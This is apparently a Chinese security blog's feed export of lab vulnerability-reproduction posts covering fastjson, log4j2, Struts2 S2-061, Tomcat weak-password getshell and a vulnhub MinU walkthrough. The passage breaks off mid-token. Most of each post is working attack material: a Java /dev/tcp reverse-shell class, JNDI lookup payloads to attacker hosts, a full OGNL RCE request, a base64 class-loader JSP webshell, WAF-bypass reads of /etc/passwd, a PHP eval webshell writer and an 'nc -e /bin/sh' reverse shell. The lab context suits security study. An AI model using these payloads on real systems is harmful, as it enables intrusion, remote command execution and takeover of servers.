marshalsec.jndi.RMIRefServer <span class="string">&quot;http://172.16.17.140:80/#TouchFile&quot;</span> 9999</span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/chencicici/images/main/202206131848263.png"></p><p>构造数据包,写入exp<br><img src="https://raw.githubusercontent.com/chencicici/images/main/202206131849458.png"></p><p>命令执行成功<br><img src="https://raw.githubusercontent.com/chencicici/images/main/202206131850067.png"></p><h3 id="反弹shell"><a href="#反弹shell" class="headerlink" title="反弹shell"></a>反弹shell</h3><p>反弹shell,只需要修改TouchFile.java文件中的command 部分即可,并重新编译,参考如下:</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// javac shell_re.java</span></span><br><span class="line"> <span class="keyword">import</span> java.lang.Runtime;</span><br><span class="line"> <span class="keyword">import</span> java.lang.Process;</span><br><span class="line"> <span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">shell_re</span> &#123;</span><br><span class="line">    <span class="keyword">static</span> &#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="type">Runtime</span> <span class="variable">rt</span> <span class="operator">=</span> Runtime.getRuntime();</span><br><span class="line">            String[] commands = &#123;<span class="string">&quot;/bin/bash&quot;</span>,<span class="string">&quot;-c&quot;</span>,<span class="string">&quot;exec 5&lt;&gt;/dev/tcp/x.x.x.x/4444;cat &lt;&amp;5 | while read line; do $line 2&gt;&amp;5 &gt;&amp;5; done&quot;</span>&#125;;</span><br><span class="line">            <span class="type">Process</span> <span class="variable">pc</span> <span class="operator">=</span> rt.exec(commands);</span><br><span class="line">            pc.waitFor();</span><br><span class="line">        &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">            <span class="comment">// do nothing</span></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"> &#125;</span><br></pre></td></tr></table></figure><p>nc 监听<br><img src="https://raw.githubusercontent.com/chencicici/images/main/202206131857057.png"></p>]]></content>
    
    
    <summary type="html">&lt;h1 id=&quot;漏洞概述&quot;&gt;&lt;a href=&quot;#漏洞概述&quot; class=&quot;headerlink&quot; title=&quot;漏洞概述&quot;&gt;&lt;/a&gt;漏洞概述&lt;/h1&gt;&lt;p&gt;CVE-2017-18349&lt;br&gt;fastjson 在解析 json 的过程中，支持使用 autoType 来实例化某一个具体的类，并调用该类的 set&amp;#x2F;get 方法来访问属性。通过查找代码中相关的方法，即可构造出一些恶意利用链。&lt;br&gt;根据官方给出的补丁文件，主要的更新在这个 checkAutoType 函数上，而这个函数的主要功能就是添加了黑名单，将一些常用的反序列化利用库都添加到黑名单中。&lt;/p&gt;
&lt;h1 id=&quot;复现环境&quot;&gt;&lt;a href=&quot;#复现环境&quot; class=&quot;headerlink&quot; title=&quot;复现环境&quot;&gt;&lt;/a&gt;复现环境&lt;/h1&gt;&lt;p&gt;vulhub项目 &lt;a href=&quot;https://vulhub.org/#/environments/fastjson/1.2.24-rce/&quot;&gt;https://vulhub.org/#/environments/fastjson/1.2.24-rce/&lt;/a&gt;&lt;/p&gt;
&lt;h1 id=&quot;Exploit&quot;&gt;&lt;a href=&quot;#Exploit&quot; class=&quot;headerlink&quot; title=&quot;Exploit&quot;&gt;&lt;/a&gt;Exploit&lt;/h1&gt;</summary>
    
    
    
    <category term="漏洞复现" scheme="https://syst1m.top/categories/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/"/>
    
    
    <category term="命令执行" scheme="https://syst1m.top/tags/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/"/>
    
    <category term="fastjson" scheme="https://syst1m.top/tags/fastjson/"/>
    
  </entry>
  
  <entry>
    <title>log4j2漏洞复现</title>
    <link href="https://syst1m.top/2022/06/12/log4j2%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/"/>
    <id>https://syst1m.top/2022/06/12/log4j2%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/</id>
    <published>2022-06-12T09:09:11.000Z</published>
    <updated>2022-06-12T13:04:12.924Z</updated>
    
    <content type="html"><![CDATA[<h1 id="概述"><a href="#概述" class="headerlink" title="概述"></a>概述</h1><p>CVE-2021-44228<br>Apache Log4j2 是一款开源的 Java 日志记录工具，大量的业务框架都使用了该组件。如：Apache Struts2、Apache Solr、Apache Druid、Apache Flink等。此次漏洞是用于 Log4j2 提供的 lookup 功能造成的，该功能允许开发者通过一些协议去读取相应环境中的配置。但在实现的过程中，并未对输入进行严格的判断，从而造成漏洞的发生。<br>在其2.0到2.14.1版本中存在一处JNDI注入漏洞，攻击者在可以控制日志内容的情况下，通过传入类似于${jndi:ldap:&#x2F;&#x2F;evil.com&#x2F;example}的lookup用于进行JNDI注入，执行任意代码。</p><h1 id="影响范围"><a href="#影响范围" class="headerlink" title="影响范围"></a>影响范围</h1><p>Apache Log4j 2.x &lt; 2.15.0-rc2</p><h1 id="环境"><a href="#环境" class="headerlink" title="环境"></a>环境</h1><p>用的是github上的一个docker环境:log4j_vuln</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">1.1 拉取漏洞环境镜像</span><br><span class="line">docker pull registry.cn-hangzhou.aliyuncs.com/fengxuan/log4j_vuln</span><br><span class="line">1.2 运行漏洞环境容器</span><br><span class="line">docker run -it -d -p 8080:8080 --name log4j_vuln_container registry.cn-hangzhou.aliyuncs.com/fengxuan/log4j_vuln</span><br><span class="line">1.3 进入容器中</span><br><span class="line">docker <span class="built_in">exec</span> -it log4j_vuln_container /bin/bash</span><br><span class="line">1.4 启动漏洞环境</span><br><span class="line">/bin/bash /home/apache-tomcat-8.5.45/bin/startup.sh</span><br><span class="line">打开http://xxx.xxx.xxx.xxx:8080/webstudy/hello-fengxuan</span><br><span class="line">出现以下页面，说明搭建成功。</span><br></pre></td></tr></table></figure><h1 id="Exploit"><a href="#Exploit" class="headerlink" title="Exploit"></a>Exploit</h1><h2 id="访问"><a href="#访问" class="headerlink" title="访问"></a>访问</h2><p>访问url<br><img src="https://raw.githubusercontent.com/chencicici/images/main/202206122023707.png"></p><h2 id="获取临时域名"><a href="#获取临时域名" class="headerlink" title="获取临时域名"></a>获取临时域名</h2><p>访问 <a href="http://dnslog.cn/">http://dnslog.cn/</a><br><img src="https://raw.githubusercontent.com/chencicici/images/main/202206121717449.png"></p><h2 id="dnslog执行代码"><a href="#dnslog执行代码" class="headerlink" title="dnslog执行代码"></a>dnslog执行代码</h2><p>构造payload</p><figure class="highlight roboconf"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">c=$&#123;<span class="attribute">jndi</span>:ldap://log4j2<span class="variable">.xxxxxx</span><span class="variable">.dnslog</span><span class="variable">.cn</span>&#125;</span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/chencicici/images/main/202206122026561.png"></p><p>查看dns平台已经执行成功<br><img src="https://raw.githubusercontent.com/chencicici/images/main/202206122026083.png"></p><h2 id="命令执行"><a href="#命令执行" class="headerlink" title="命令执行"></a>命令执行</h2><p>在本地先要生成JNDI链接并启动后端相关服务，注意防火墙开启相关端口，用的是<a href="https://download.fastgit.org/Mr-xn/JNDIExploit-1/releases/download/v1.2/JNDIExploit.v1.2.zip">JNDIExploit-1.2-SNAPSHOT.jar</a></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">java -jar JNDIExploit-1.2-SNAPSHOT.jar -i 10.20.146.195 -l 9999 -p 80</span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/chencicici/images/main/202206122035772.png"></p><p>构造payload</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">cmd: <span class="built_in">whoami</span></span><br><span class="line"></span><br><span class="line">c=<span class="variable">$&#123;jndi:ldap://10.20.146.195:9999/TomcatBypass/TomcatEcho&#125;</span></span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/chencicici/images/main/202206122055177.png"></p><h1 id="修复方案"><a href="#修复方案" class="headerlink" title="修复方案"></a>修复方案</h1><p>补丁链接:<br><a href="https://github.com/apache/logging-log4j2/releases/tag/log4j-2.15.0-rc2">log4j-2.15.0-rc2</a></p><ol><li><p>添加jvm启动参数-Dlog4j2.formatMsgNoLookups&#x3D;true；</p></li><li><p>在应用classpath下添加log4j2.component.properties配置文件，文件内容为log4j2.formatMsgNoLookups&#x3D;true；</p></li><li><p>JDK使用11.0.1、8u191、7u201、6u211及以上的高版本。</p></li></ol>]]></content>
    
    
    <summary type="html">&lt;h1 id=&quot;概述&quot;&gt;&lt;a href=&quot;#概述&quot; class=&quot;headerlink&quot; title=&quot;概述&quot;&gt;&lt;/a&gt;概述&lt;/h1&gt;&lt;p&gt;CVE-2021-44228&lt;br&gt;Apache Log4j2 是一款开源的 Java 日志记录工具，大量的业务框架都使用了该组件。如：Apache Struts2、Apache Solr、Apache Druid、Apache Flink等。此次漏洞是用于 Log4j2 提供的 lookup 功能造成的，该功能允许开发者通过一些协议去读取相应环境中的配置。但在实现的过程中，并未对输入进行严格的判断，从而造成漏洞的发生。&lt;br&gt;在其2.0到2.14.1版本中存在一处JNDI注入漏洞，攻击者在可以控制日志内容的情况下，通过传入类似于${jndi:ldap:&amp;#x2F;&amp;#x2F;evil.com&amp;#x2F;example}的lookup用于进行JNDI注入，执行任意代码。&lt;/p&gt;
&lt;h1 id=&quot;影响范围&quot;&gt;&lt;a href=&quot;#影响范围&quot; class=&quot;headerlink&quot; title=&quot;影响范围&quot;&gt;&lt;/a&gt;影响范围&lt;/h1&gt;&lt;p&gt;Apache Log4j 2.x &amp;lt; 2.15.0-rc2&lt;/p&gt;
&lt;h1 id=&quot;环境&quot;&gt;&lt;a href=&quot;#环境&quot; class=&quot;headerlink&quot; title=&quot;环境&quot;&gt;&lt;/a&gt;环境&lt;/h1&gt;</summary>
    
    
    
    <category term="漏洞复现" scheme="https://syst1m.top/categories/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/"/>
    
    
    <category term="命令执行" scheme="https://syst1m.top/tags/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/"/>
    
    <category term="log4j2" scheme="https://syst1m.top/tags/log4j2/"/>
    
  </entry>
  
  <entry>
    <title>Struts2 S2-061漏洞复现</title>
    <link href="https://syst1m.top/2022/06/11/Struts2S2-061%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/"/>
    <id>https://syst1m.top/2022/06/11/Struts2S2-061%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/</id>
    <published>2022-06-11T13:38:12.000Z</published>
    <updated>2022-06-12T13:05:12.670Z</updated>
    
    <content type="html"><![CDATA[<h1 id="概述"><a href="#概述" class="headerlink" title="概述"></a>概述</h1><p>Apache Struts于2020年12月08日披露 S2-061 Struts 远程代码执行漏洞(CVE-2020-17530)<br>Struts2 会对某些标签属性(比如 <code>id</code>，其他属性有待寻找) 的属性值进行二次表达式解析，因此当这些标签属性中使用了 <code>%&#123;x&#125;</code> 且 <code>x</code> 的值用户可控时，用户再传入一个 <code>%&#123;payload&#125;</code> 即可造成OGNL表达式执行。S2-061是对S2-059沙盒进行的绕过。</p><p>影响范围:Apache Struts 2.0.0-2.5.25</p><h1 id="环境"><a href="#环境" class="headerlink" title="环境"></a>环境</h1><p>vulhub项目地址 <a href="https://vulhub.org/#/environments/struts2/s2-061/">https://vulhub.org/#/environments/struts2/s2-061/</a></p><h1 id="Exploit"><a href="#Exploit" class="headerlink" title="Exploit"></a>Exploit</h1><h2 id="poc检测"><a href="#poc检测" class="headerlink" title="poc检测"></a>poc检测</h2><p>使用poc检测漏洞是否存在,需要使用url编码</p><figure class="highlight maxima"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=<span class="symbol">%</span><span class="number">25</span>%7b+%27test%<span class="number">27</span>+%2b+(<span class="number">11</span>+<span class="symbol">%</span><span class="number">2b+11</span>).toString()%7d</span><br></pre></td></tr></table></figure><p>审查元素看到回显<br><img src="https://raw.githubusercontent.com/chencicici/images/main/202206121321542.png"></p><h2 id="exp利用"><a href="#exp利用" class="headerlink" title="exp利用"></a>exp利用</h2><p>发送下面数据包</p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">POST</span> <span class="string">/index.action</span> <span class="meta">HTTP/1.1</span></span><br><span class="line"><span class="attribute">Host</span><span class="punctuation">: </span>localhost:8080</span><br><span class="line"><span class="attribute">Accept-Encoding</span><span class="punctuation">: </span>gzip, deflate</span><br><span class="line"><span class="attribute">Accept</span><span class="punctuation">: </span>*/*</span><br><span class="line"><span class="attribute">Accept-Language</span><span class="punctuation">: </span>en</span><br><span class="line"><span class="attribute">User-Agent</span><span class="punctuation">: </span>Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.132 Safari/537.36</span><br><span class="line"><span class="attribute">Connection</span><span class="punctuation">: </span>close</span><br><span class="line"><span class="attribute">Content-Type</span><span class="punctuation">: </span>multipart/form-data; boundary=----WebKitFormBoundaryl7d1B1aGsV2wcZwF</span><br><span class="line"><span class="attribute">Content-Length</span><span class="punctuation">: </span>831</span><br><span class="line"></span><br><span class="line"><span class="language-clean">------WebKitFormBoundaryl7d1B1aGsV2wcZwF</span></span><br><span class="line"><span class="language-clean">Content-Disposition: form-data; name=<span class="string">&quot;id&quot;</span></span></span><br><span class="line"><span class="language-clean"></span></span><br><span class="line"><span class="language-clean">%&#123;(#instancemanager=#application[<span class="string">&quot;org.apache.tomcat.InstanceManager&quot;</span>]).(#stack=#attr[<span class="string">&quot;com.opensymphony.xwork2.util.ValueStack.ValueStack&quot;</span>]).(#bean=#instancemanager.newInstance(<span class="string">&quot;org.apache.commons.collections.BeanMap&quot;</span>)).(#bean.setBean(#stack)).(#context=#bean.get(<span class="string">&quot;context&quot;</span>)).(#bean.setBean(#context)).(#macc=#bean.get(<span class="string">&quot;memberAccess&quot;</span>)).(#bean.setBean(#macc)).(#emptyset=#instancemanager.newInstance(<span class="string">&quot;java.util.HashSet&quot;</span>)).(#bean.put(<span class="string">&quot;excludedClasses&quot;</span>,#emptyset)).(#bean.put(<span class="string">&quot;excludedPackageNames&quot;</span>,#emptyset)).(#arglist=#instancemanager.newInstance(<span class="string">&quot;java.util.ArrayList&quot;</span>)).(#arglist.add(<span class="string">&quot;whoami&quot;</span>)).(#execute=#instancemanager.newInstance(<span class="string">&quot;freemarker.template.utility.Execute&quot;</span>)).(#execute.exec(#arglist))&#125;</span></span><br><span class="line"><span class="language-clean">------WebKitFormBoundaryl7d1B1aGsV2wcZwF--</span></span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/chencicici/images/main/202206121340388.png"></p>]]></content>
    
    
    <summary type="html">&lt;h1 id=&quot;概述&quot;&gt;&lt;a href=&quot;#概述&quot; class=&quot;headerlink&quot; title=&quot;概述&quot;&gt;&lt;/a&gt;概述&lt;/h1&gt;&lt;p&gt;Apache Struts于2020年12月08日披露 S2-061 Struts 远程代码执行漏洞(CVE-2020-17530)&lt;br&gt;Struts2 会对某些标签属性(比如 &lt;code&gt;id&lt;/code&gt;，其他属性有待寻找) 的属性值进行二次表达式解析，因此当这些标签属性中使用了 &lt;code&gt;%&amp;#123;x&amp;#125;&lt;/code&gt; 且 &lt;code&gt;x&lt;/code&gt; 的值用户可控时，用户再传入一个 &lt;code&gt;%&amp;#123;payload&amp;#125;&lt;/code&gt; 即可造成OGNL表达式执行。S2-061是对S2-059沙盒进行的绕过。&lt;/p&gt;
&lt;p&gt;影响范围:Apache Struts 2.0.0-2.5.25&lt;/p&gt;
&lt;h1 id=&quot;环境&quot;&gt;&lt;a href=&quot;#环境&quot; class=&quot;headerlink&quot; title=&quot;环境&quot;&gt;&lt;/a&gt;环境&lt;/h1&gt;&lt;p&gt;vulhub项目地址 &lt;a href=&quot;https://vulhub.org/#/environments/struts2/s2-061/&quot;&gt;https://vulhub.org/#/environments/struts2/s2-061/&lt;/a&gt;&lt;/p&gt;</summary>
    
    
    
    <category term="漏洞复现" scheme="https://syst1m.top/categories/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/"/>
    
    
    <category term="Struts2" scheme="https://syst1m.top/tags/Struts2/"/>
    
    <category term="命令执行" scheme="https://syst1m.top/tags/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/"/>
    
  </entry>
  
  <entry>
    <title>Tomcat弱口令后台getshll复现</title>
    <link href="https://syst1m.top/2022/06/10/Tomcat%E5%BC%B1%E5%8F%A3%E4%BB%A4%E5%90%8E%E5%8F%B0getshll/"/>
    <id>https://syst1m.top/2022/06/10/Tomcat%E5%BC%B1%E5%8F%A3%E4%BB%A4%E5%90%8E%E5%8F%B0getshll/</id>
    <published>2022-06-10T07:36:45.000Z</published>
    <updated>2022-06-10T09:30:30.246Z</updated>
    
    <content type="html"><![CDATA[<h1 id="环境"><a href="#环境" class="headerlink" title="环境"></a>环境</h1><p>vulhub <a href="https://vulhub.org/#/environments/tomcat/tomcat8/">https://vulhub.org/#/environments/tomcat/tomcat8/</a></p><h1 id="Exploit"><a href="#Exploit" class="headerlink" title="Exploit"></a>Exploit</h1><p><img src="https://raw.githubusercontent.com/chencicici/images/main/202206101540258.png"></p><p>弱密码登录后</p><p>将shell.jsp打包成shell.zip，在改后缀为shell.war上传</p><p>密码passwd</p><figure class="highlight jsp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">&lt;%!</span><br><span class="line">    <span class="keyword">class</span> <span class="title class_">U</span> <span class="keyword">extends</span> <span class="title class_">ClassLoader</span> &#123;</span><br><span class="line">        U(ClassLoader c) &#123;</span><br><span class="line">            <span class="built_in">super</span>(c);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">public</span> Class <span class="title function_">g</span><span class="params">(<span class="type">byte</span>[] b)</span> &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="built_in">super</span>.defineClass(b, <span class="number">0</span>, b.length);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"> </span><br><span class="line">    <span class="keyword">public</span> <span class="type">byte</span>[] base64Decode(String str) <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="type">Class</span> <span class="variable">clazz</span> <span class="operator">=</span> Class.forName(<span class="string">&quot;sun.misc.BASE64Decoder&quot;</span>);</span><br><span class="line">            <span class="keyword">return</span> (<span class="type">byte</span>[]) clazz.getMethod(<span class="string">&quot;decodeBuffer&quot;</span>, String.class).invoke(clazz.newInstance(), str);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">            <span class="type">Class</span> <span class="variable">clazz</span> <span class="operator">=</span> Class.forName(<span class="string">&quot;java.util.Base64&quot;</span>);</span><br><span class="line">            <span class="type">Object</span> <span class="variable">decoder</span> <span class="operator">=</span> clazz.getMethod(<span class="string">&quot;getDecoder&quot;</span>).invoke(<span class="literal">null</span>);</span><br><span class="line">            <span class="keyword">return</span> (<span class="type">byte</span>[]) decoder.getClass().getMethod(<span class="string">&quot;decode&quot;</span>, String.class).invoke(decoder, str);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">%&gt;</span><br><span class="line">&lt;%</span><br><span class="line">    <span class="type">String</span> <span class="variable">cls</span> <span class="operator">=</span> request.getParameter(<span class="string">&quot;passwd&quot;</span>);</span><br><span class="line">    <span class="keyword">if</span> (cls != <span class="literal">null</span>) &#123;</span><br><span class="line">        <span class="keyword">new</span> <span class="title class_">U</span>(<span class="built_in">this</span>.getClass().getClassLoader()).g(base64Decode(cls)).newInstance().equals(pageContext);</span><br><span class="line">    &#125;</span><br><span class="line">%&gt;</span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/chencicici/images/main/202206101552494.png"></p><p><img src="https://raw.githubusercontent.com/chencicici/images/main/202206101558421.png"></p><p>连接url<br><a href="http://localhost:8080/shell/shell.jsp">http://localhost:8080/shell/shell.jsp</a><br><img src="https://raw.githubusercontent.com/chencicici/images/main/202206101555698.png"></p>]]></content>
    
    
    <summary type="html">&lt;h1 id=&quot;环境&quot;&gt;&lt;a href=&quot;#环境&quot; class=&quot;headerlink&quot; title=&quot;环境&quot;&gt;&lt;/a&gt;环境&lt;/h1&gt;&lt;p&gt;vulhub &lt;a href=&quot;https://vulhub.org/#/environments/tomcat/tomcat8/&quot;&gt;https://vulhub.org/#/environments/tomcat/tomcat8/&lt;/a&gt;&lt;/p&gt;
&lt;h1 id=&quot;Exploit&quot;&gt;&lt;a href=&quot;#Exploit&quot; class=&quot;headerlink&quot; title=&quot;Exploit&quot;&gt;&lt;/a&gt;Exploit&lt;/h1&gt;&lt;p&gt;&lt;img src=&quot;https://raw.githubusercontent.com/chencicici/images/main/202206101540258.png&quot;&gt;&lt;/p&gt;
&lt;p&gt;弱密码登录后&lt;/p&gt;</summary>
    
    
    
    <category term="漏洞复现" scheme="https://syst1m.top/categories/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/"/>
    
    
    <category term="Tomcat" scheme="https://syst1m.top/tags/Tomcat/"/>
    
    <category term="弱口令" scheme="https://syst1m.top/tags/%E5%BC%B1%E5%8F%A3%E4%BB%A4/"/>
    
  </entry>
  
  <entry>
    <title>红队渗透项目vulnhub-MinUv1打靶</title>
    <link href="https://syst1m.top/2022/06/09/%E7%BA%A2%E9%98%9F%E6%B8%97%E9%80%8F%E9%A1%B9%E7%9B%AEvulnhub-MinUv1%E6%89%93%E9%9D%B6/"/>
    <id>https://syst1m.top/2022/06/09/%E7%BA%A2%E9%98%9F%E6%B8%97%E9%80%8F%E9%A1%B9%E7%9B%AEvulnhub-MinUv1%E6%89%93%E9%9D%B6/</id>
    <published>2022-06-09T02:58:27.000Z</published>
    <updated>2022-06-09T07:35:55.353Z</updated>
    
    <content type="html"><![CDATA[<h1 id="环境"><a href="#环境" class="headerlink" title="环境"></a>环境</h1><p>靶机项目地址<a href="https://www.vulnhub.com/entry/minu-1,235/">https://www.vulnhub.com/entry/minu-1,235/</a><br>使用vm导入靶机需要关掉网卡2,再重新dhclinent</p><p>靶机:172.16.17.144</p><p>攻击机kali:172.16.17.140</p><h1 id="目标"><a href="#目标" class="headerlink" title="目标"></a>目标</h1><p>拿到root下的flag<br><img src="https://raw.githubusercontent.com/chencicici/images/main/202206091226745.png"></p><h1 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h1><h2 id="nmap收集"><a href="#nmap收集" class="headerlink" title="nmap收集"></a>nmap收集</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap -A -sV -sS -T5 172.16.17.144</span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/chencicici/images/main/202206091107061.png"></p><p>中间件为Apache2.4.27,服务器为ubuntu</p><h2 id="目录爆破"><a href="#目录爆破" class="headerlink" title="目录爆破"></a>目录爆破</h2><p><img src="https://raw.githubusercontent.com/chencicici/images/main/202206091108873.png"><br>打开发现只有一个apache首页,丢到dirb爆破</p><p><img src="https://raw.githubusercontent.com/chencicici/images/main/202206091110331.png"><br>几乎都是403,应该是有限制,要么是脚本要么是waf,继续加大力度爆破</p><p><img src="https://raw.githubusercontent.com/chencicici/images/main/202206091133000.png"></p><p>发现一个test.php<br><img src="https://raw.githubusercontent.com/chencicici/images/main/202206091137577.png"></p><h1 id="Exploit"><a href="#Exploit" class="headerlink" title="Exploit"></a>Exploit</h1><h2 id="命令执行"><a href="#命令执行" class="headerlink" title="命令执行"></a>命令执行</h2><p>发现关键字,一般file&#x3D;xx可能会存在命令执行,文件包含,文件下载,文件读取等漏洞<br>尝试读取文件403,应该是存在waf<br><img src="https://raw.githubusercontent.com/chencicici/images/main/202206091224040.png"></p><ul><li>尝试命令执行,成功回显<br><img src="https://raw.githubusercontent.com/chencicici/images/main/202206091226943.png"><br>ls,cat等命令被拦截</li></ul><h2 id="waf绕过"><a href="#waf绕过" class="headerlink" title="waf绕过"></a>waf绕过</h2><p>手工fuzz发现使用?或者*可以绕过waf,同样会被解析</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">原payload  /bin/cat /ect/passwd</span><br><span class="line">绕过 /b?n/c?t /e?t/pa??wd</span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/chencicici/images/main/202206091257717.png"></p><h2 id="尝试写马失败"><a href="#尝试写马失败" class="headerlink" title="尝试写马失败"></a>尝试写马失败</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">原payload</span><br><span class="line">/bin/echo <span class="built_in">echo</span>  <span class="string">&#x27;&lt;?php @eval($_POST[&quot;shell&quot;]);?&gt;&#x27;</span>&gt;&gt;shell.php|/usr/bin/base64 -d|/bin/bash</span><br><span class="line"></span><br><span class="line">base64编码过后</span><br><span class="line">|/b?n/e?ho ZWNobyAgJzw/cGhwIEBldmFsKCRfUE9TVFsic2hlbGwiXSk7Pz4nPj5zaGVsbC5waHA=|/u?r/b?n/b?se64 -d|/b?n/b?sh</span><br></pre></td></tr></table></figure><p>在本地kali测试成功,但是在靶机上失败,不知道原因可能被waf拦截了<br><img src="https://raw.githubusercontent.com/chencicici/images/main/202206091354331.png"></p><p>写马不行那就试试nc反弹</p><h2 id="反弹shell"><a href="#反弹shell" class="headerlink" title="反弹shell"></a>反弹shell</h2><p>本地监听5555端口<br><img src="https://raw.githubusercontent.com/chencicici/images/main/202206091418598.png"></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">原payload</span><br><span class="line">/bin/echo <span class="string">&quot;nc -e /bin/sh 172.16.17.140 5555&quot;</span> | /usr/bin/base64 -d| /bin/sh </span><br><span class="line"></span><br><span class="line">base64编码过后</span><br><span class="line">/b?n/e??o bmMgLWUgL2Jpbi9zaCAxNzIuMTYuMTcuMTQwIDU1NTUg|/?s?/b??/b??e64 -d|/b?n/sh </span><br></pre></td></tr></table></figure><p>需要注意的是,base64编码过后会出现&#x3D;或者&#x3D;&#x3D;,会被waf拦截,可以末尾添加空格</p><p><img src="https://raw.githubusercontent.com/chencicici/images/main/202206091418922.png"></p><p>用python反弹一个交互式shell</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python3 -c <span class="string">&#x27;import pty; pty.spawn(&quot;/bin/bash&quot;)&#x27;</span> </span><br></pre></td></tr></table></figure><p>这里要注意的是,要根据靶机python变量来,可能是python可能是python3<br><img src="https://raw.githubusercontent.com/chencicici/images/main/202206091421850.png"><br>找到线索<br><img src="https://raw.githubusercontent.com/chencicici/images/main/202206091424098.png"></p><h2 id="JWT"><a href="#JWT" class="headerlink" title="JWT"></a>JWT</h2><p>一开始以为是编码或者加密,没解出来,仔细看发现,是以<code>.</code>分割的三段字符串,标准的JWT</p><figure class="highlight gcode"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">eyJhbGciOiJIUzI<span class="number">1</span><span class="symbol">NiIsInR5</span>cCI<span class="number">6</span>IkpX<span class="attr">VCJ9</span>.eyJzdWIiOiIxMj<span class="name">M0</span><span class="symbol">NTY3</span>ODkwIiwibmFtZSI<span class="number">6</span>Ikpva<span class="name">G4</span>gR<span class="name">G9</span>lIiwiaWF<span class="number">0</span>Ijox<span class="symbol">NTE2</span>Mj<span class="name">M5</span>MDIyfQ.p<span class="symbol">n55</span>j<span class="number">1</span>CFpcLjvReaqyJr<span class="number">0</span>BPEMYUsBdoDxEP<span 